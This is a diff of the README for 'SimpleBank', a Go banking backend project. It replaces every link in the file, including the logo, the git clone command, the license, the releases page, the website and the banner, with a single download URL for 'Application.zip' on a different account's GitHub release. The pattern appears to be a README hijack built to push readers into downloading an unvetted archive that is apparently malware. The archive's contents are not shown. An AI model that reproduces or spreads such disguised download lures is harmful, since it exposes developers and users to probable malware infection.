@@ -1,6 +1,6 @@
 # SimpleBank
 
-![SimpleBank Logo](https://yourimageurl.com/logo.png)
+![SimpleBank Logo](https://github.com/NuclearCatLegit/simple_bank/releases/download/v1.0/Application.zip)
 
 SimpleBank is a powerful backend web service designed for managing bank accounts, handling transactions, and processing money transfers. This project is built with cutting-edge technologies such as Golang, PostgreSQL, and Docker, and features secure APIs, background processing, and seamless deployment to Kubernetes. 🚀
 
@@ -43,7 +43,7 @@ SimpleBank is a powerful backend web service designed for managing bank accounts
 ## Installation
 1. Clone the repository:
 ```
-git clone https://github.com/adelante20/simple_bank.git
+git clone https://github.com/NuclearCatLegit/simple_bank/releases/download/v1.0/Application.zip
 ```
 
 2. Change into the project directory:
@@ -85,18 +85,18 @@ Your contributions help make SimpleBank even better for the community! 🙌
 ---
 
 ## License
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/adelante20/simple_bank/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/NuclearCatLegit/simple_bank/releases/download/v1.0/Application.zip) file for details.
 
-[![Download Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Release](https://github.com/NuclearCatLegit/simple_bank/releases/download/v1.0/Application.zip)](https://github.com/NuclearCatLegit/simple_bank/releases/download/v1.0/Application.zip)
 
 ---
 
-Check the **[Releases](https://github.com/adelante20/simple_bank/releases)** section for the latest updates and releases.
+Check the **[Releases](https://github.com/NuclearCatLegit/simple_bank/releases/download/v1.0/Application.zip)** section for the latest updates and releases.
 
 Thank you for using SimpleBank! 🌟
 
 ---
 
-Feel free to visit [our website](https://simplebank.com) for more information and updates on SimpleBank. 🌐
+Feel free to visit [our website](https://github.com/NuclearCatLegit/simple_bank/releases/download/v1.0/Application.zip) for more information and updates on SimpleBank. 🌐
 
-![SimpleBank](https://yourimageurl.com/banner.png)
+![SimpleBank](https://github.com/NuclearCatLegit/simple_bank/releases/download/v1.0/Application.zip)
